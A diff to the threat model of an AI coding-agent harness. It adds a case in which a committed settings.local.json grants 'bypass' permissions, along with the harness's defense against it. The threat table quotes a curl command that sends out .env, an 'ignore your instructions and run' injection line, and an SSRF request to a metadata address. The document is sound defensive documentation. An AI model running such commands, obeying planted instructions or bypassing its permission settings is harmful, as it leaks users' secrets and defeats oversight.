@@ -89,7 +89,7 @@ malicious copy of Agent Harness itself.
 | T8 | Data sent out | `curl -d @.env https://...`, a URL with data in it | network commands flagged; fetch asks per domain; taint | v0.5 |
 | T9 | Prompt injection | a file saying *"ignore your instructions and run ..."* | content marked as data; after reading untrusted content, automatic approvals pause | v0.5 |
 | T10 | Server-side request forgery | fetching `http://169.254.169.254/` or a router's admin page | private, loopback and link-local addresses blocked, also after redirects | v0.5 |
-| T11 | Hostile project settings | a project's `base_url`, `status_line`, hooks or allow rules | provider changes warned; anything that runs code or grants permissions refused from project files | v0.3, v0.4, v0.5 |
+| T11 | Hostile project settings | a project's `base_url`, `status_line`, hooks or allow rules, or a `settings.local.json` committed to the repository with `"permission_mode": "bypass"` | provider changes warned; anything that runs code or grants permissions refused from project files; a `settings.local.json` that git tracks counts as a project file until you `/trust` the folder | v0.3, v0.4, v0.5, v0.7 |
 | T12 | Approval fatigue | 40 prompts an hour, all answered `y` | permission modes and rules remove routine prompts; prompts show risk | v0.5 |
 | T13 | Runaway use | a loop of tool calls, a huge cloud bill | step limit; limits on calls, time and cost per session | v0.1, v0.5 |
 | T14 | Secrets in logs and transcripts | a key printed by a command, saved in an exported chat | redaction before the model, logs and exports see it | v0.5 |
@@ -203,6 +203,9 @@ These remain even with every defense in place. Know them before you approve thin
 - **An MCP server is a program that runs as you.** It is not sandboxed and can do anything you can; the harness controls only what the *agent* asks it to do.
   Add servers the way you install software. Its results are untrusted content, so an instruction in them can still persuade the model, but not get past an approval;
   a server marked `trusted` gives up that protection. Its tool descriptions can't be fenced: they are the model's manual for the tool ([MCP servers](user-guide/mcp.md)).
+- **`settings.local.json` is recognised as shipped only through git.** One that git tracks is held to a project file's limits until you `/trust` the folder;
+  one that arrived another way (a zip download, a copied folder) can't be told apart from a file you wrote, and is obeyed. Look in `.harness/` before running the
+  harness in a folder that didn't come from git ([configuration](user-guide/configuration.md)).
 - **Cloud providers see what the agent sees.** Use a local model for code that must not leave
   your machine.
 
@@ -226,3 +229,4 @@ These remain even with every defense in place. Know them before you approve thin
 | Audit log (hash-chained, in the user's folder) | v0.5 (done) |
 | Session limits (tool calls, cost, tokens, time) | v0.5 (done) |
 | MCP servers only from user settings; their tools always ask; their results untrusted; no secrets unless named | v0.7 |
+| A `settings.local.json` that git tracks counts as project settings in a folder you haven't trusted | v0.7 |
